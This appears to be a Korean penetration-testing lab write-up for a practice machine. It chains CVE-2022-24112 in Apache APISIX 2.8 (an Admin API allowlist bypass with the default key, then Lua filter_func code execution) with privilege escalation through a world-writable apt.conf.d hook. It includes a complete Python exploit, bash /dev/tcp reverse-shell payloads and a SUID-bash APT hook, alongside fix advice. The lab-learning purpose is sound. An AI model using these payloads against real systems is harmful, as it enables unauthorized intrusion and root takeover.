---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/default-creds
  - tech/web/auth-bypass
  - tech/web/cmd-injection
  - tech/payload/revshell
  - tech/lin/cron
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.248.220
ports: [22, 80, 3306, 9443, 43500]
services: [http, mysql, ssh, ssl/tungsten-https, tungsten-https]
cves: [CVE-2022-24112]
status: solved
manual_tags: true
manual_cves: true
tech_count: 7
---

> [!info] 요약
> 타겟 `192.168.248.220` · Ubuntu 20.04.4 LTS(`flimsy`, 커널 5.4.0-122-generic) · Fundamental · 플래그 2개
> 진입점: tcp/43500 Apache APISIX 2.8 → CVE-2022-24112 — `batch-requests` 가 하위 요청을 루프백에서 재발행하며 호출자 헤더를 그대로 실어 Admin API 의 IP 허용목록이 무너짐 → 기본 admin key 로 라우트 생성 → `filter_func` 의 Lua `os.execute` 로 RCE → `franklin`(uid 65534)
> 권한상승: 세계쓰기 `/etc/apt/apt.conf.d` + 매분 도는 `root apt-get update` → `APT::Update::Pre-Invoke` 훅으로 SUID bash → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.220

### Initial Access – batch-requests 플러그인이 Admin API 의 IP 허용목록을 무력화하고 라우트 `filter_func` 의 Lua 가 그대로 RCE 가 됨

**Vulnerability Explanation:** 세 결함이 체인됨.
- APISIX 2.8 의 `batch-requests` 플러그인이 하위 요청을 게이트웨이 **자신에게 루프백으로 재발행**하면서 호출자가 지정한 헤더(`X-Real-IP` 포함)를 그대로 실어 보냄 — Admin API 의 `allow_admin: 127.0.0.0/24` 허용목록이 무너짐. CVE-2022-24112, 영향 범위 1.3 ~ 2.12.0 · 2.10.x LTS 는 2.10.4 미만
- Admin API 의 두 번째 겹인 `X-API-KEY` 가 배포 기본값 `edd1c9f034335f136f87ad84b625c8f1` 그대로 — 방어로 기능하지 않음
- 라우트 스키마의 `filter_func` 가 **Lua 함수 소스를 문자열로 받아 라우트 매칭 시점에 평가** — 설정 필드가 곧 코드 실행 sink. 취약점 부류로는 설정값 주입을 통한 원격 코드 실행

**Vulnerability Fix:**
- 2.12.1 / 2.10.4 이상으로 업그레이드하거나 `batch-requests` 를 비활성화할 것 — 해당 버전이 하위 요청의 real-ip 헤더를 실제 클라이언트 IP 로 덮어씀
- `config.yaml` 의 `admin_key` 를 설치 시 반드시 교체할 것. 벤더가 주석으로 직접 경고하고 있었음
- Admin API 를 `port_admin` 으로 데이터플레인 포트에서 분리할 것 — 43500 이 외부에 열려 있어도 관리면은 비노출
- 인가를 `X-Real-IP` 같은 클라이언트 제어 헤더로 판정하지 말 것. 신뢰 프록시 앞단에서 무조건 제거·재작성

**Severity:** Critical — 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `-p-` 전 포트 스캔으로 tcp/43500 발견 → 응답 헤더 `Server: APISIX/2.8` 확인
2. `/apisix/admin/routes` 직접 호출 → openresty 403 (IP 허용목록 존재 확인)
3. `POST /apisix/batch-requests` 본문 `headers` 에 `X-Real-IP: 127.0.0.1` + 기본 `X-API-KEY` 를 넣고 하위 GET 재발행 → 하위 응답 200
4. 같은 경로로 `PUT /apisix/admin/routes/pwn1` — `filter_func` 에 Lua `os.execute` 리버스셸 삽입 → 201 Created
5. Kali 에 tcp/443 리스너 기동 후 `GET /pwn1` 로 라우트 매칭 발화 → `franklin`(uid 65534) 셸

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.220 | TCP: 22, 80, 3306, 9443, 43500 |

예열로 top-1000 을 먼저 돌림. 22·80·3306 뿐 — 이 결과만으로 판단을 시작했으면 정적 사이트와 접속 거부되는 MySQL 만 붙들고 있었을 것임.

```text
Nmap scan report for 192.168.248.220
Host is up (0.089s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```
— 출처: `~/PG/Flimsy/nmap_quick.log`

`-p-` 결과가 박스 전체임.

```text
Nmap scan report for 192.168.248.220
Host is up (0.085s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http                nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open  mysql               MySQL (unauthorized)
9443/tcp  open  ssl/tungsten-https?
43500/tcp open  http                OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
```
— 출처: `~/PG/Flimsy/nmap.log`

예열 스캔이 43500 을 못 준 이유는 `nmap-services` 에 있음. **43500/tcp 는 등재 자체가 없어** `--top-ports` 를 몇으로 잡든 후보에 들어가지 않음. 9443 은 등재돼 있으나 빈도순 1096위라 top-1000 바로 바깥임.

```bash
grep -P '\t43500/tcp' /usr/share/nmap/nmap-services
grep '/tcp' /usr/share/nmap/nmap-services | sort -k3 -rn | grep -n '9443/tcp'
```

첫 명령은 출력 없음. 둘째 출력:

```text
1096:tungsten-https	9443/tcp	0.000152	# WSO2 Tungsten HTTPS
```
— Kali 에서 확인한 것. 이 박스의 산출물이 아님

9443 은 APISIX 의 TLS 데이터플레인. `curl -k` 로 아무것도 돌아오지 않아 더 파지 않았음.
같이 나온 OS 추정 `Running: Linux 5.X, MikroTik RouterOS 7.X` 는 오탐 — 실제로는 Ubuntu 20.04.4 LTS(`harvest_franklin.txt` `===== OS =====`).

**80 번은 미끼**

![[PG-Flimsy-80-upright-decoy.png]]

templatemo 계열 정적 템플릿("Upright"). `Last-Modified: Thu, 28 Apr 2022` 고정, 동적 요소 없음. gobuster 는 `directory-list-2.3-medium.txt` 에 `-x php,txt,html,zip,bak`, 스레드 50 으로 돌림.

```text
/index.html           (Status: 200) [Size: 50895]
/img                  (Status: 301) [Size: 178] [--> http://192.168.248.220/img/]
/css                  (Status: 301) [Size: 178] [--> http://192.168.248.220/css/]
/js                   (Status: 301) [Size: 178] [--> http://192.168.248.220/js/]
```
— 출처: `~/PG/Flimsy/gobuster_root.txt`

**끝까지 돈 것이 아님.** `gobuster_root.full.txt` 는 21:27:23 에 뜬 **69행짜리 화면 스냅샷**임 — 배너 12행 · 결과 4행 뒤로 timeout 에러 50행이 이어지고 `Progress:`·완료 배너가 없음. 사전 소진이 아니라 타겟이 응답을 못 하기 시작한 상태임.

```text
[ERROR] error on word 4829.txt: timeout occurred during the request
[ERROR] error on word bahamas.html: timeout occurred during the request
[ERROR] error on word 103106.php: timeout occurred during the request
[ERROR] error on word bahamas: timeout occurred during the request
[ERROR] error on word bahamas.zip: timeout occurred during the request
[ERROR] error on word bahamas.bak: timeout occurred during the request
```
— 출처: `~/PG/Flimsy/gobuster_root.full.txt` (스냅샷 말미)

스캔 자체는 그 뒤로도 계속 돌아 **21:38 에 종료됨**(작업 메모 `writeup_notes.txt`). nginx `access.log` 가 21:35 에 395,013행, 12:36 UTC 에 419,537행까지 자란 것이 근거임(`Post-Exploitation` 「남긴 흔적」). **파일 mtime 은 스냅샷을 뜬 시각이지 스캔 종료 시각이 아님.**

따라서 「80 번에 아무것도 없다」의 근거는 gobuster 완주가 아니라 **정적 템플릿이라는 것**(이 절의 스크린샷 · 고정된 `Last-Modified`)임.

**3306 은 외부에서 못 씀**

```text
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.207' is not allowed to connect to this MySQL server
```
— 세션 기록에서 옮긴 것. `writeup_notes.txt` 21:24 에는 `Host '192.168.45.207' is not allowed to connect` 부분만 남아 있음. 감싼 문구는 Kali mariadb 클라이언트(11.8.3) 의 형식 문자열과 일치하나 리다이렉트한 로그는 없음

바인딩은 `0.0.0.0:3306` 이지만 grant 가 localhost 한정이라 외부에서는 인증 단계에 도달하지 못함. 30초 만에 접었음.

**버전 판정 — 근거 둘**

배너 하나로 CVE 를 고르지 않음.

1. 응답 헤더 `Server: APISIX/2.8` — nmap 과 `curl -i` 양쪽에서 동일
2. **행동** — `/apisix/batch-requests` 로 감싼 Admin API 호출이 실제로 200 을 받음(`Initial Access` 재현 절). 2.12.1 / 2.10.4 이상이면 이 경로가 막혀 있음

root 획득 후 `config.yaml` 로 3차 확인됨(`Privilege Escalation` 절).

### Initial Access – APISIX batch-requests → Lua RCE

**우회 검증 — 먼저 읽기만**

파괴적이지 않고, 되면 다음이 확실함.

```bash
#!/bin/bash
T=192.168.248.220:43500
curl -s -i -X POST "http://$T/apisix/batch-requests" \
  -H 'X-Real-IP: 127.0.0.1' \
  -H 'Content-Type: application/json' \
  -d '{"headers":{"X-Real-IP":"127.0.0.1","X-API-KEY":"edd1c9f034335f136f87ad84b625c8f1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"GET","path":"/apisix/admin/routes"}]}'
```
— 출처: `~/PG/Flimsy/try1_batch_probe.sh`

그 앞에 Admin API 를 직접 때려본 기록이 있음. 21:25 작업 메모(`writeup_notes.txt`)에 「`/apisix/admin/routes` 직접 → openresty 403 Forbidden」으로만 남아 있고 **`curl` 출력을 리다이렉트한 로그가 없음.** 아래는 그 세션 기록에서 옮긴 것임.

```bash
curl -s -i 'http://192.168.248.220:43500/apisix/admin/routes' -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'
```

```text
HTTP/1.1 403 Forbidden
Server: openresty
...
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty</center>
</body>
</html>
```
— 파일로 보존되지 않음. 세션 기록에서 옮긴 것

이 403 은 실패가 아니라 **전제조건 확인**임. IP 허용목록이 켜져 있다는 뜻이고, CVE-2022-24112 는 정확히 그 허용목록을 우회하는 결함임.

`X-Real-IP` 가 **두 군데** 들어가 있음. 「안쪽만 넣으면 바깥 요청이 걸러진다」로 읽기 쉬우나 그렇지 않음 — 2.8 소스의 `set_common_header()` 는 ① 본문 `headers` 를 하위 요청에 먼저 깔고 ② 바깥 요청 헤더로 **아직 안 채워진 키만** 메움. 안쪽이 우선이고 바깥은 예비임.

그리고 `/apisix/batch-requests` 는 데이터플레인 엔드포인트라 IP 제한이 없음 — 외부 IP 에서 보낸 바깥 요청이 그대로 200 을 받았음. 둘 다 넣는 것은 손해가 없어 그대로 뒀음. **헷갈리면 본문 `headers` 쪽 하나면 됨.**

```http
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 12:25:10 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Server: APISIX/2.8

[{"status":200,"body":"{\"action\":\"get\",\"count\":1,\"node\":{\"dir\":true,\"key\":\"\\\/apisix\\\/routes\",\"nodes\":[{\"value\":{\"status\":1,\"filter_func\":\"function(vars) os.execute('bash -c \\\\\\\"0<&160-;exec 160<>\\\/dev\\\/tcp\\\/192.168.118.3\\\/80;sh <&160 >&160 2>&160\\\\\\\"'); return true end\",\"update_time\":1658799753,\"uri\":\"\\\/rms\\\/fzxewh\",\"upstream\":{\"nodes\":{\"schmidt-schaefer.com\":1},\"type\":\"roundrobin\",\"scheme\":\"http\",\"pass_host\":\"pass\",\"hash_on\":\"vars\"},\"priority\":0,\"create_time\":1658799753,\"id\":\"index\",\"name\":\"wthtzv\"},\"createdIndex\":15772,\"key\":\"\\\/apisix\\\/routes\\\/index\",\"modifiedIndex\":15772}]}}\n","reason":"OK","headers":{"Transfer-Encoding":"chunked","Access-Control-Allow-Credentials":"true","Date":"Thu, 20 Aug 2026 12:25:10 GMT","Access-Control-Expose-Headers":"*","Connection":"keep-alive","Access-Control-Allow-Origin":"*","Content-Type":"application\/json","Server":"openresty","Access-Control-Max-Age":"3600"}}]
```
— 출처: `~/PG/Flimsy/try1_batch_probe.log`

바깥 200, 하위 요청도 `"status":200`. **두 층을 모두 봐야 함** — 바깥 200 은 batch-requests 가 요청을 받았다는 뜻일 뿐이고, 우회 성공은 안쪽 status 로 판정함.

**우회가 성립하는 이유**

APISIX 는 API 게이트웨이. 라우팅 규칙은 Admin API(`/apisix/admin/*`)로 넣고 etcd 에 저장됨. Admin API 는 두 겹으로 보호됨 — ① IP 허용목록(기본값 `allow_admin: - 127.0.0.0/24`) ② `X-API-KEY` 토큰(기본값 `edd1c9f034335f136f87ad84b625c8f1`, 같은 파일에 viewer 용 `4054f7cf07e344346cd3f287985e76a2` 도 있음). 두 기본값 모두 2.8 태그의 `conf/config-default.yaml` 원문에서 확인한 것임.

무너지는 지점은 둘이 겹친 것임.

- 하위 요청은 게이트웨이 자신이 루프백으로 거는 것이므로 Admin API 가 보는 연결 상대는 **이미 로컬호스트**임
- 2.8 의 `batch-requests.lua` 에는 **클라이언트 IP 를 다시 세우는 코드가 없음.** 호출자가 지정한 헤더가 그대로 하위 요청에 실림 — `X-Real-IP` 포함

2.12.1 이 넣은 수정이 이것을 그대로 보여줌 — 하위 요청마다 real-ip 헤더를 실제 클라이언트 IP 로 덮어씀.

```lua
-- apisix 2.12.1 batch-requests.lua, set_common_header() 끝줄
req.headers[real_ip_hdr] = core.request.get_remote_client_ip()
```

두 겹 중 첫 겹이 이것으로 무너지고, 두 번째 겹은 기본 키가 안 바뀌어 있어 애초에 방어가 아니었음.

> [!note] 이 박스의 이미지에 이전 작업자의 페이로드가 굳어 있음
> Admin API 를 처음 읽었을 때 라우트가 **이미 하나** 있었음. `id=index`, `uri=/rms/fzxewh`, `filter_func` 안에 `192.168.118.3:80` 으로 나가는 리버스셸, `create_time` 은 1658799753 = 2022-07-26.
> 남의 IP 로 나가는 셸이라 쓸모가 없고, 덮어쓰면 원래 상태를 잃음. `routes_preexisting.json` 으로 보존하고 **내 라우트는 `id=pwn1` 로 분리**했음.

**왜 이 페이로드인가 — `filter_func`**

Admin API 를 잡았다고 바로 셸이 되는 것은 아님. 라우트 스키마 중 `filter_func` 만이 Lua 함수 소스를 문자열로 받아 라우트 매칭 시점에 평가함.

```lua
function(vars) os.execute('bash -c "0<&160-;exec 160<>/dev/tcp/192.168.45.207/443;sh <&160 >&160 2>&160"'); return true end
```

| 조각 | 역할 |
|---|---|
| `function(vars) ... return true end` | APISIX 가 요구하는 필터 시그니처. `true` 를 반환해야 라우트가 매칭된 것으로 처리됨 |
| `os.execute(...)` | Lua 표준 라이브러리. OpenResty 워커 프로세스 권한으로 셸 명령 실행 |
| `0<&160-` | `n<&m-` 은 fd `m` 을 fd `n` 으로 옮기는(dup 후 원본 닫기) 문법이니 여기서는 160 → stdin. 그런데 이 시점에 160 은 열려 있지 않음 — bash 는 `160: Bad file descriptor` 를 뱉고 **다음 명령으로 그냥 넘어감**(Kali 에서 확인, exit 0). 원라이너에 관용적으로 붙는 앞머리일 뿐 실제 일은 아래 두 줄이 함 |
| `exec 160<>/dev/tcp/...` | bash 전용 기능. TCP 소켓을 fd 160 에 읽기·쓰기로 엶 |
| `sh <&160 >&160 2>&160` | 그 소켓에 stdin/stdout/stderr 를 전부 물린 `sh` |

`bash -c` 로 감싼 이유가 있음. `/dev/tcp` 는 **bash 의 기능이지 POSIX sh 의 기능이 아님.** `os.execute` 는 `/bin/sh` 를 부르고 우분투에서 그것은 dash 임. 그리고 dash 는 `/dev/tcp` 에 **도달조차 못 함** — 앞의 `0<&160-` 에서 먼저 파싱이 깨짐.

```bash
dash -c '0<&160-;exec 160<>/dev/tcp/127.0.0.1/9;sh <&160 >&160 2>&160'
```

```text
dash: 1: Syntax error: Bad fd number
```
— Kali 에서 확인한 것. 이 박스의 산출물이 아님

`No such file or directory` 가 아님. 파일이 없어서 실패하는 것이 아니라 **문법 단계에서 죽는 것**이라 에러 문구만 보고 「경로 문제」로 오독하기 쉬움.

**익스플로잇**

JSON 문자열 안에 또 JSON 문자열이 들어가고 그 안에 따옴표 든 Lua 가 들어감. 이 삼중 인용을 손으로 쓰면 반드시 틀림 — `json.dumps` 에 맡겼음.

```python
#!/usr/bin/env python3
# CVE-2022-24112 - Apache APISIX 2.8 admin API IP-restriction bypass -> Lua RCE
# The batch-requests plugin trusts a client-supplied X-Real-IP when it replays
# sub-requests internally, so the admin API's 127.0.0.1 allowlist is bypassed.
import json, sys, urllib.request

TARGET = 'http://192.168.248.220:43500'
KEY    = 'edd1c9f034335f136f87ad84b625c8f1'   # APISIX default admin key
LHOST, LPORT = '192.168.45.207', 443
RID, URI = 'pwn1', '/pwn1'

cmd = f'bash -c "0<&160-;exec 160<>/dev/tcp/{LHOST}/{LPORT};sh <&160 >&160 2>&160"'
route = {
    'uri': URI,
    'upstream': {'type': 'roundrobin', 'nodes': {'example.com:80': 1}},
    # filter_func is evaluated as Lua by the router on every request match
    'filter_func': "function(vars) os.execute('" + cmd + "'); return true end",
}
payload = {
    'headers': {'X-Real-IP': '127.0.0.1', 'X-API-KEY': KEY,
                'Content-Type': 'application/json'},
    'timeout': 1500,
    'pipeline': [{'method': 'PUT', 'path': f'/apisix/admin/routes/{RID}',
                  'body': json.dumps(route)}],
}
if sys.argv[1:] == ['trigger']:
    try:
        urllib.request.urlopen(TARGET + URI, timeout=5).read()
    except Exception as e:
        print('trigger returned:', e)
else:
    req = urllib.request.Request(TARGET + '/apisix/batch-requests',
        data=json.dumps(payload).encode(),
        headers={'X-Real-IP': '127.0.0.1', 'Content-Type': 'application/json'})
    print(urllib.request.urlopen(req, timeout=15).read().decode())
```
— 출처: `~/PG/Flimsy/exploit_apisix.py`

`upstream` 은 스키마 필수 필드라 넣었을 뿐 실제로 쓰이지 않음. `filter_func` 는 **업스트림에 프록시하기 전, 라우트 매칭 단계에서** 평가되므로 `example.com` 이 안 열려도 상관없음.

```json
[{"status":201,"body":"{\"node\":{\"value\":{\"status\":1,\"filter_func\":\"function(vars) os.execute('bash -c \\\"0<&160-;exec 160<>\\\/dev\\\/tcp\\\/192.168.45.207\\\/443;sh <&160 >&160 2>&160\\\"'); return true end\",\"update_time\":1787228753,\"id\":\"pwn1\",\"priority\":0,\"create_time\":1787228753,\"uri\":\"\\\/pwn1\",\"upstream\":{\"nodes\":{\"example.com:80\":1},\"type\":\"roundrobin\",\"hash_on\":\"vars\",\"pass_host\":\"pass\",\"scheme\":\"http\"}},\"key\":\"\\\/apisix\\\/routes\\\/pwn1\"},\"action\":\"set\"}\n","reason":"Created","headers":{"Transfer-Encoding":"chunked","Access-Control-Allow-Credentials":"true","Date":"Thu, 20 Aug 2026 12:25:53 GMT","Access-Control-Expose-Headers":"*","Connection":"close","Access-Control-Allow-Origin":"*","Content-Type":"application\/json","Server":"openresty","Access-Control-Max-Age":"3600"}}]
```
— 출처: `~/PG/Flimsy/try2_route_create.log`

`"status":201` = Created. 이제 `GET /pwn1` 한 번이면 발화함.

발화 쪽 출력은 항상 타임아웃임. **이 타임아웃은 실패가 아니라 성공의 정상 형태** — 셸이 fd 를 물고 있어 응답이 끝나지 않기 때문임.

```text
trigger returned: timed out
```
— 출처: `~/PG/Flimsy/try3_trigger.log` · `try4_trigger2.log` (각 28바이트, 동일 내용)

**셸**

리스너는 tmux 안에.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s fli_sh 'sudo rlwrap -cAr nc -lvnp 443; exec bash'"
```

아웃바운드 443 이 그냥 열려 있었음. 포트를 바꿔가며 찾는 시간이 0 이었음.

`fli_sh` 는 **두 번째** 리스너임. 첫 리스너는 `nc -lvnp 443 2>&1 | tee shell443.log` 였고 셸은 붙었으나 화면에 아무것도 안 떴음 — `tee` 블록 버퍼링임.

```text
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.220] 60714
```
— 출처: `~/PG/Flimsy/shell443.log` (전문, 94바이트). **복원본임** — 원본은 21:52 「정리」 중 삭제됐다가 세션 기록의 원문으로 되살린 것. 현재 디스크상 mtime 은 **21:55**(복원 시각)이고 관측 당시는 `Aug 20 21:26`. 내용은 `wc -c` = 94 로 원본과 같음

94바이트 = nc 배너뿐이라는 것이 곧 판별 근거임. 판별법·조치는 [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]]. 아래 캡처의 포트가 **60800** 인 것은 그래서임 — **60714 는 버려진 첫 연결**임.

```bash
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.220] 60800
id; hostname; hostname -I
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
flimsy
192.168.248.220
python3 -c "import pty;pty.spawn(\"/bin/bash\")"
franklin@flimsy:/root$ export TERM=xterm PS1="\u@\h:\w\$ "; id
export TERM=xterm PS1="\u@\h:\w\$ "; id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
```
— 출처: `~/PG/Flimsy/pane_full.txt` (`tmux capture-pane -p -t fli_sh`)

PTY 승격 명령은 셸에 실제로 밀어넣은 형태 그대로임 — 바깥 인용부호를 이스케이프해야 하는 것이 요점이라 정리하지 않았음. 같은 명령이 두 번 찍히는 것은 PTY 에코임. **이 박스의 타겟 블록은 전부 이 형태이고, 에코가 없는 타겟 블록은 손질된 것으로 봐야 함.**

승격 직후 프롬프트가 `franklin@flimsy:/root$` — **cwd 가 `/root`** 임. APISIX 를 root 가 `/root` 에서 띄웠다는 뜻이고 `Privilege Escalation` 절의 `run.sh` 로 확인됨.

> [!note] `franklin` 은 uid 65534 임
> `uid=65534(franklin)` 는 오타가 아님. 65534 는 원래 `nobody` 자리인데 이 박스는 그 자리에 이름을 바꿔 넣었음.
> ```text
> franklin:x:65534:65534::/home/frank:/bin/bash
> ```
> — 출처: `~/PG/Flimsy/root_context.txt` `### passwd-tail`
>
> APISIX 워커는 기본 설정상 `nobody` 로 떨어지므로 결과적으로 워커가 `franklin` 으로 보임.
> 홈 경로가 `/home/frank` 인데 실제 디렉터리는 `/home/franklin` 이라 어긋나 있음 — `cat ~/local.txt` 로는 못 찾음. 절대경로로 읽어야 함.

**Local.txt value:** `ad396f9bb652fedd964f20285dab04cd`

```bash
franklin@flimsy:/root$ cd /home/franklin; whoami; id; hostname; hostname -I; dat
e; cat /home/franklin/local.txt
cd /home/franklin; whoami; id; hostname; hostname -I; date; cat /home/franklin/l
ocal.txt
franklin
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
flimsy
192.168.248.220
Thu Aug 20 12:28:10 UTC 2026
ad396f9bb652fedd964f20285dab04cd
franklin@flimsy:/home/franklin$
```
— 출처: `~/PG/Flimsy/proof_user.txt` (80칸 줄접힘은 `capture-pane` 캡처 그대로)

리버스셸에서 원위치 `cat` 으로 읽음. 웹셸이 아님. 두 플래그 파일 모두 mtime 이 `Aug 20 12:18` 로 이번 인스턴스 생성 시각임 — PG 는 박스를 켤 때마다 플래그를 새로 만드므로 **이 값은 2026-08-20 인스턴스의 것**임.

미끼 플래그는 **찾아본 적이 없음.** franklin 시점의 `find / -name local.txt -o -name proof.txt` 는 `/home/franklin/local.txt` 하나만 줬고(그때는 `/root` 를 읽을 수 없었음), root 로 올라온 뒤 `harvest_root.txt` 의 `===== FLAGS =====` 도 같은 한 줄뿐임. `flag*` 같은 다른 이름으로는 훑지 않았으므로 「미끼가 없다」가 아니라 **관측이 없다**가 맞음.

### Privilege Escalation – 세계쓰기 `/etc/apt/apt.conf.d` + 매분 도는 root 크론

**Vulnerability Explanation:** 두 오설정의 교집합.
- `/etc/apt/apt.conf.d` 가 `drwxrwxrwx`(세계쓰기) — 정상 설치에서 나올 수 없는 퍼미션
- `/etc/crontab` 에 `* * * * * root apt-get update` — root 가 매분 apt 실행
- `apt` 는 기동 시 `/etc/apt/apt.conf.d/` 의 모든 파일을 사전순으로 읽어 설정으로 병합함. 그중 `APT::Update::Pre-Invoke` 는 `apt-get update` 가 실제 갱신을 시작하기 **전에** 실행할 셸 명령 목록임 — 디렉터리 쓰기 권한이 곧 root 코드 실행
- 취약점 부류로는 특권 크론이 읽는 설정 디렉터리의 퍼미션 오설정

**Vulnerability Fix:**
- `/etc/apt/apt.conf.d` 를 `755 root:root` 로 되돌릴 것. 이 박스의 `777` 은 정상 설치에서 나올 수 없는 값임
- `/root/run.sh` 의 `777` 도 동일 — root 크론이 실행하는 스크립트는 root 만 쓸 수 있어야 함
- 게이트웨이 워커를 `nobody` 로 떨어뜨리는 것 자체는 방어가 아님. 이 박스의 `franklin` 은 특권이 0이었으나 크론 + 퍼미션 결함만으로 root 가 됐음

**Severity:** Critical — 로컬 저권한에서 60초 안에 root

**Steps to reproduce the attack:**
1. `harvest.sh` 로 일괄 열거 — `sudo`·SUID·capabilities 전부 빈손
2. `===== CRON =====` 의 `* * * * * root apt-get update` 와 `===== WRITABLE =====` 의 `/etc/apt/apt.conf.d` 를 나란히 확인
3. `mount` 로 `/tmp` 가 `/`(ext4, `nosuid` 없음) 위임을 확인
4. Kali 에서 훅 파일을 만들어 `curl` 로 내려받아 `/etc/apt/apt.conf.d/99zzpwn` 에 배치
5. 크론 한 사이클(최대 60초) 대기 → `/tmp/rootbash` 생성
6. `/tmp/rootbash -p` 실행 → euid=0

**열거**

셸 잡자마자 `harvest.sh` 를 돌려 전 항목을 파일로 떨궜음 — `~/PG/Flimsy/harvest_franklin.txt`, 1471행. 읽은 순서대로.

```text
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
```
— 출처: `~/PG/Flimsy/harvest_franklin.txt:27`

괄호 줄은 `harvest.sh` 가 직접 찍는 것임. 비번을 모르니 여기서 막힘. `id` 의 그룹도 `nogroup` 하나뿐이라 특권 그룹 경로도 없음.

```text
===== SUID =====
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
```
— 출처: `~/PG/Flimsy/harvest_franklin.txt:31` (이하 `/snap/core20/1581`·`1587`, `/snap/snapd/16292`·`16010` 아래 중복 26행 생략)

전부 우분투 20.04 기본. 비표준 없음. `pkexec` 가 보이면 CVE-2021-4034 를 떠올리게 되나 이 박스는 그 경로가 필요 없었음.

```text
===== CAPS =====
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
— 출처: `~/PG/Flimsy/harvest_franklin.txt:98` (이하 `/snap/core20/1581`·`1587` 의 ping 2행 생략)

전부 기본. 여기까지가 헛걸음이고 다음 두 섹션이 답임.

```text
===== CRON =====
no crontab for franklin
-- /etc/crontab --
...
* * * * * root apt-get update
* * * * * root /root/run.sh
```
— 출처: `~/PG/Flimsy/harvest_franklin.txt:106` (두 크론 줄은 `:131`·`:132`. 가운데 `...` 는 `/etc/crontab` 주석 헤더 생략)

```text
===== WRITABLE =====
/var/crash
/var/tmp
/run/screen
/run/lock
/usr/local/apisix/uwsgi_temp
/usr/local/apisix/fastcgi_temp
/usr/local/apisix/client_body_temp
/usr/local/apisix/proxy_temp
/usr/local/apisix/scgi_temp
/etc/apt/apt.conf.d
/tmp
/tmp/.ICE-unix
/tmp/.h
/tmp/disk_cache_one
/tmp/.Test-unix
/tmp/.XIM-unix
/tmp/.X11-unix
/tmp/.font-unix
```
— 출처: `~/PG/Flimsy/harvest_franklin.txt:1322` (전문)

**`/etc/apt/apt.conf.d` 가 쓰기 가능**하고 **root 가 매분 `apt-get update` 를 돔.** 이 두 줄을 나란히 놓으면 끝남.

같은 열거의 `===== LISTEN =====` 에는 밖에서 안 보이던 루프백 서비스가 있음 — `127.0.0.1:2379`·`2380`(etcd), `127.0.0.1:9090`·`9091`(APISIX 내부), `127.0.0.1:33060`(MySQL X 프로토콜). 이 박스는 쓰지 않았으나 셸을 잡으면 내부 리슨을 항상 볼 것.

퍼미션 확인. `ls -ld /etc/apt/apt.conf.d /root` 를 따로 친 출력은 **산출물 어디에도 없음** — 그 형태로는 인용할 수 없음. 같은 사실은 세 곳에 실제로 남아 있음.

- `harvest_franklin.txt` 의 `===== WRITABLE =====` 목록에 `/etc/apt/apt.conf.d` 가 들어 있음 (franklin 이 쓸 수 있다는 뜻)
- 21:30 작업 메모(`writeup_notes.txt`)에 그 디렉터리가 `drwxrwxrwx` 로 적혀 있음
- `/root` 가 `drwx------` 인 것은 아래 발화 블록의 `ls -la /root` 첫 줄에 그대로 보이고, franklin 시점에는 `pane_full.txt` 의 `ls: cannot open directory '/root': Permission denied` 로 확인됨

`/tmp` 가 별도 마운트가 아니라 `/`(ext4, `nosuid` 없음) 위에 있는 것도 먼저 확인했음. tmpfs `nosuid` 였으면 이 페이로드는 조용히 실패함.

```text
/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime)
```
— 출처: `~/PG/Flimsy/harvest_franklin.txt:1349` `===== MOUNTS =====`

**훅 배치**

파일명을 `99zzpwn` 으로 한 이유는 사전순 마지막이라 기존 설정과 충돌하지 않기 때문임.

```text
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash";};
```
— 출처: `~/PG/Flimsy/apt_hook_99zzpwn.conf`

리버스셸 대신 SUID bash 를 고른 이유는 둘 — 리스너를 하나 더 띄울 필요가 없고, **정리할 때 파일 두 개만 지우면 원상복구**됨.

